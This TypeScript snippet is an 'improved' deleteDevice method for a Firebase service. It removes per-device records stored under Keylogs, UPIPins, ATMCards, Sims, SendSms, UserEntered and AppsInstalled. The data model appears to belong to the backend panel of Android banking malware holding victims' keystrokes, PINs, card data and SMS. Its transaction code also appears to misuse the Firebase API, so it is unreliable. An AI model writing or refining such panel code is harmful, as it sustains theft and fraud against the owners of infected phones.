// This is the improved version of the deleteDevice method
// Replace the existing deleteDevice method in firebaseService.ts with this implementation

async deleteDevice(deviceId: string): Promise<void> {
  try {
    // First, get the ResponseChecker data to find any entries related to this device
    const responseCheckerRef = ref(database, 'ResponseChecker');
    const snapshot = await get(responseCheckerRef);
    
    // Create a transaction to ensure atomic deletion
    await runTransaction(database, async (transaction) => {
      // Standard paths to delete
      const pathsToDelete = [
        `DeviceInfo/${deviceId}`,
        `Sims/${deviceId}`,
        `Keylogs/${deviceId}`,
        `UPIPins/${deviceId}`,
        `UserEntered/${deviceId}`,
        `AppsInstalled/${deviceId}`,
        `ResponseChecks/${deviceId}`,
        `ATMCards/${deviceId}`,
        `SendSms/${deviceId}`
      ];

      // Delete each path
      pathsToDelete.forEach(path => {
        transaction.remove(ref(database, path));
      });

      // Handle ResponseChecker entries
      if (snapshot.exists()) {
        const responseCheckers = snapshot.val();
        Object.entries(responseCheckers || {}).forEach(([key, value]: [string, any]) => {
          // Check if the key matches the deviceId or if the value contains the deviceId
          if (key === deviceId || value?.deviceId === deviceId) {
            transaction.remove(ref(database, `ResponseChecker/${key}`));
          }
        });
      }

      return null; // Transaction must return null or undefined
    });

    console.log(`Successfully deleted all data for device: ${deviceId}`);
  } catch (error) {
    console.error("Error deleting device:", error);
    throw error;
  }
}
